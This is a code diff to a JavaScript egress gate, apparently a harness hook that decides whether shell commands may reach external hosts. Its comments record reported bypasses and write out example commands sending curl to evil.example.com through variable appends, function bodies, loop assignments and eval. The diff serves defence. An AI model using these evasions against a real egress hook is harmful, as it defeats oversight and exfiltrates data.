@@ -264,7 +264,12 @@ const MAX_EXPANDED_GROWTH = 8192
 const UNREAD_VALUE = '${EGRESS_GATE_UNREAD_VALUE%}'
 const LOOP_HEAD = (ws, k) => ws[k].text === 'for' && !ws[k].quoted && /^[A-Za-z_][A-Za-z0-9_]*$/.test(ws[k + 1]?.text ?? '') &&
   !ws[k + 1].quoted && ws[k + 2]?.text === 'in' && !ws[k + 2].quoted
-function collectAssignments(r, outer = null, outerLoops = null) {
+// Card 1a95f6c5 (Viktor 43355 LOW 2): `NAME+=value` appends, and it was no assignment here (the name had to be followed
+// by `=`), so `V=http://; V+=evil.example.com; curl -s $V/p` reached curl as an unread $V and passed. It is read as the
+// name's value so far (this command's, else unset: empty, as bash has it) followed by the expanded value.
+// `records` (when given) gets every assignment in text order, { name, raw, prefix, value }, for the function reading
+// in classifyRead (card 1a95f6c5): a function body runs when it is called, not where it stands.
+function collectAssignments(r, outer = null, outerLoops = null, records = null) {
   const env = Object.create(null)
   const loopNames = new Set(outerLoops ? Object.keys(outerLoops) : [])
   // the lookup: own values over the enclosing ones; a loop variable is shadowed as unset from its loop head on (an
@@ -274,10 +279,12 @@ function collectAssignments(r, outer = null, outerLoops = null) {
   for (const ws of r.segWords) {
     for (const [k, w] of ws.entries()) {
       if (LOOP_HEAD(ws, k)) { loopNames.add(ws[k + 1].text); scope[ws[k + 1].text] = undefined }
-      const m = /^[A-Za-z_][A-Za-z0-9_]*=/.exec(w.text)
+      const m = /^[A-Za-z_][A-Za-z0-9_]*\+?=/.exec(w.text)
       if (!m || !/^c+$/.test(r.lxB.cls.slice(w.start, w.start + m[0].length))) continue
-      const name = m[0].slice(0, -1)
+      const append = m[0].endsWith('+=')
+      const name = m[0].slice(0, append ? -2 : -1)
       const raw = w.text.slice(m[0].length)
+      const prefix = append ? (scope[name] ?? '') : ''
       let value = raw
       // A quoted or escaped $ ('$V', \$V, $'\x24V') is a literal, the word text no longer shows which is which: a value
       // with only literal ones keeps its text, as before; one with both kinds (`"$V"'$x'`) is not read (unresolved).
@@ -289,16 +296,16 @@ function collectAssignments(r, outer = null, outerLoops = null) {
         if (c === 'c' || c === 'd') live++
         else if (!(c === 'a' && r.blankCp[k + 1] === "'" && r.lxB.cls[k + 1] === 'a')) literal++ // not a $'...' opener
       }
-      if (literal && live) value = UNREAD_VALUE
-      else if (live && raw.includes('$')) {
-        // an upper bound of the expansion: every $NAME gives at most its value (a default word's own names are
-        // counted where they stand)
-        let bound = raw.length
-        for (const x of raw.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) bound += scope[x[1]]?.length ?? 0
-        value = bound - raw.length > MAX_EXPANDED_GROWTH ? UNREAD_VALUE : expand(raw, scope, loopNames)
-      }
+      // an upper bound of the expansion: every $NAME gives at most its value (a default word's own names are
+      // counted where they stand), and an append keeps the value so far (`A+=$B` again and again grows like `A=$A$B`)
+      const isLive = live > 0 && raw.includes('$') // a mixed value (literal && live) is UNREAD_VALUE below
+      let bound = raw.length + prefix.length
+      if (isLive) for (const x of raw.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) bound += scope[x[1]]?.length ?? 0
+      if ((literal && live) || bound - raw.length > MAX_EXPANDED_GROWTH) value = UNREAD_VALUE
+      else value = prefix + (isLive ? expand(raw, scope, loopNames) : raw)
       env[name] = value
       scope[name] = value
+      records?.push({ name, raw, prefix, value, live: isLive })
     }
   }
   return env
@@ -322,6 +329,43 @@ function collectLoops(r, env) {
     for (const v of vals) list.push(v)
   }
   return loops
+}
+// Card 1a95f6c5 (Viktor 43355 LOW 1): a function body runs when it is CALLED, so the text order the assignments are read
+// in is not the order they run in: `fn() { curl -s $U/p; U=$V; }; U=localhost; V=evil.example.com; fn; fn` reads U as
+// localhost, and bash's second call sends to the external host. In a command that defines a function, a name assigned
+// more than once is read like a loop variable over every value it gets: each value as read in text order, and each
+// value read again with all of this command's assignments in place (an assignment in the body may run after them).
+// Over-reading is the safe side, and only a command with a function definition pays for it (the readings are bounded
+// by MAX_LOOP_VARIANTS like any loop, past it the span fails closed).
+const FUNCTION_DEF = /(?:^|[\s;&|(){}])function[ \t]+[A-Za-z_][\w.:-]*|[A-Za-z_][\w.:-]*[ \t]*\([ \t]*\)/
+function functionValues(r, records, env) {
+  if (!records.length || !FUNCTION_DEF.test(r.codeText)) return []
+  const byName = new Map()
+  for (const a of records) {
+    let vals = byName.get(a.name)
+    if (!vals) byName.set(a.name, (vals = new Set()))
+    vals.add(pasteBound(a.value, env))
+    if (a.live && a.value !== UNREAD_VALUE) {
+      let bound = a.raw.length + a.prefix.length
+      for (const x of a.raw.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) bound += env[x[1]]?.length ?? 0
+      vals.add(bound - a.raw.length > MAX_EXPANDED_GROWTH ? UNREAD_VALUE : a.prefix + expand(a.raw, env))
+    }
+  }
+  // a name whose readings are not just its text-order value (several values, or one that reads otherwise in the body)
+  return [...byName].filter(([n, s]) => s.size > 1 || !s.has(env[n])).map(([n, s]) => [n, [...s]])
+}
+// A value pasted into a span for the loop readings (a value naming a loop variable, a function reading) can still hold
+// $NAME references (`U=$v$B` keeps $B when B is assigned later), and the readings' final expand reads them: past the
+// growth limit the value is pasted as UNREAD_VALUE, as an assignment past it is stored (`A=$v$B$B...` with 25 000
+// references to an 8 000-character B would otherwise build 200 million characters).
+function pasteBound(v, env) {
+  if (typeof v !== 'string' || !v.includes('$')) return v
+  let grow = 0
+  for (const x of v.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) {
+    grow += env[x[1]]?.length ?? 0
+    if (grow > MAX_EXPANDED_GROWTH) return UNREAD_VALUE
+  }
+  return v
 }
 // Every reading of a span a loop can produce: one text per loop value (per combination, for nested
 // loops). Past MAX_LOOP_VARIANTS the span is not judged value by value: null, and the caller fails
@@ -352,8 +396,38 @@ function loopOrder(loops) {
 // pasted raw when it is one word, so a value that spells another loop variable (`for a in '$b'`) is replaced again
 // when that variable comes later, and the order decides whether it does (test: "loop readings keep the definition order").
 // The size check runs before the product.
+// Card e94e8bd2 (found measuring c20467d6): a loop variable reached through an assignment. `U=$v` in the loop body keeps
+// `$v` as written (the loop variable is shadowed from its head on), and the readings below looked for loop names in the
+// span's own text only: `for v in <ext>; do U=$v; curl -s $U/p; done` named U, no loop variable, and the final expand
+// left `$v` -- a bare environment name, unread -- so the call passed while bash sent it to the external host. A plain
+// $NAME / ${NAME} whose value names a loop variable is now put in first, so the loop readings see the loop name.
+// memo: loop order -> env layer -> (name -> its value names one of those loop variables); one frame reuses its
+// (env, loops) pair for every span, and the same env layer can meet other loops in an inner frame
+const NAMES_LOOP = new WeakMap()
+const SIMPLE_REF = /\$\{([A-Za-z_][A-Za-z0-9_]*)\}|\$([A-Za-z_][A-Za-z0-9_]*)(?![A-Za-z0-9_])/g
+function viaLoopValues(text, env, order) {
+  if (!order.size || !text.includes('$')) return text
+  let byEnv = NAMES_LOOP.get(order)
+  if (!byEnv) NAMES_LOOP.set(order, (byEnv = new WeakMap()))
+  let memo = byEnv.get(env)
+  if (!memo) byEnv.set(env, (memo = new Map()))
+  return text.replace(SIMPLE_REF, (all, a, b) => {
+    const n = a ?? b
+    if (order.has(n)) return all
+    let put = memo.get(n) // the text to put in, or null
+    if (put === undefined) {
+      const v = env[n]
+      const hit = typeof v === 'string' && v.includes('$') &&
+        [...v.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)].some((x) => order.has(x[1]))
+      put = hit ? pasteBound(v, env) : null
+      memo.set(n, put)
+    }
+    return put ?? all
+  })
+}
 function loopVariants(text, env, loops) {
   const order = loopOrder(loops)
+  text = viaLoopValues(text, env, order)
   const named = new Set()
   for (const m of text.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)) if (order.has(m[1])) named.add(m[1])
   let out = [text]
@@ -364,8 +438,11 @@ function loopVariants(text, env, loops) {
     if (!re.test(text)) continue
     re.lastIndex = 0
     if (out.length * vals.length > MAX_LOOP_VARIANTS) return null
+    // Viktor 43683 LELET 1: a value still holding a `$` reference (`W=$X`, X unseen) may be empty in bash, so whether
+    // `:-` / `:=` takes the word is unknown: read as UNREAD_VALUE (in a curl host: unresolved), as expand() leaves the
+    // form as written in the plain reading. Pasting the reference text made it non-empty, and the word was never read.
     out = out.flatMap((t) => vals.map((x) => t.replace(re, (all, colon, word) =>
-      (!(colon && x === '') ? asWord(x) : word)))) // $v / ${v}: colon is undefined
+      (colon && x.includes('$') ? UNREAD_VALUE : !(colon && x === '') ? asWord(x) : word)))) // $v / ${v}: colon is undefined
   }
   // In a loop reading the loop variables hold the LOOP value: an assignment of the same name elsewhere in the command
   // must not stand in for it (Viktor 43216 LOW 1: `V=localhost; for V in <ext> ...; curl "${V-${V:-x}}"` read the
@@ -835,6 +912,19 @@ export function shellCStrings(ws) {
   }
   return out
 }
+// `eval` as the command word (card 40305fb7, Viktor 42794 INFO, measured by Dave on prod d85d82e3): `eval "curl <url>"`
+// and `eval curl <url>` passed, because the command word was eval, not curl, and nothing read what eval runs. Bash
+// joins eval's arguments (quotes already removed) with single spaces and runs the result as a command line, so the
+// joined words are judged like a `bash -c` string. Only at the command word (after assignments and wrappers such as
+// `command` / `builtin`): a word `eval` elsewhere (`echo eval curl <url>`, `git log --grep eval`) runs nothing. A
+// leading `--` is eval's end of options and is dropped. A command word that is a variable (`f=eval; $f ...`) is not
+// resolved here, as for every other command (`f=curl; $f <url>` passes too; a separate finding).
+export function evalString(mw, i) {
+  if (i >= mw.length || mw[i] !== 'eval') return null
+  const args = mw.slice(i + 1)
+  if (args[0] === '--') args.shift()
+  return args.length ? args.join(' ') : null
+}
 // Text of the heredoc bodies announced in segment s (not a `<<<` here-string: its text is already in the
 // span), from the lexer's heredocs; an unterminated body runs to the end, as the shell reads it.
 function heredocBodies(r, s) {
@@ -908,11 +998,14 @@ function classifyRead(command, depth, vendorHosts, vendorDomains, scope) {
   // command (12 000 `vN=$(echo a); ` took 14-17 s, past the hook's timeout, which allows). env is only ever looked up by
   // name (expand), so a frame's own assignments go on a layer over the enclosing env; loops is read by key order
   // (loopVariants), so it is copied only when the frame has loops of its own.
-  const own = collectAssignments(r, outer.env, outer.loops)
+  const records = []
+  const own = collectAssignments(r, outer.env, outer.loops, records)
   const env = Object.keys(own).length ? Object.assign(Object.create(outer.env), own) : outer.env
   const ownLoops = Object.entries(collectLoops(r, env))
-  const loops = ownLoops.length ? Object.assign(Object.create(null), outer.loops) : outer.loops
+  const fnValues = functionValues(r, records, env)
+  const loops = ownLoops.length || fnValues.length ? Object.assign(Object.create(null), outer.loops) : outer.loops
   for (const [v, vals] of ownLoops) loops[v] = [...(loops[v] ?? []), ...vals]
+  for (const [v, vals] of fnValues) if (!(v in loops)) loops[v] = vals
   const inners = r.frames.filter((f) => f.inner !== null).map((f) => f.inner)
   if (depth < 4) {
     const inner = { env, loops, externalLiteral: outer.externalLiteral }
@@ -946,6 +1039,8 @@ function classifyRead(command, depth, vendorHosts, vendorDomains, scope) {
     // with this command's assignments and loop values, up to the same depth (see shellCStrings). Before the
     // command-word check: `env -S '<line>'` has no command word of its own (card 74d46cd0).
     const cStrings = shellCStrings(mw)
+    const evalText = evalString(mw, i)
+    if (evalText !== null) cStrings.push(evalText)
     if (cStrings.length && depth < 4) {
       const inner = { env, loops, externalLiteral: outer.externalLiteral }
       for (const str of cStrings) { const res = classify(str, depth + 1, vendorHosts, vendorDomains, inner); if (res.deny) return res }
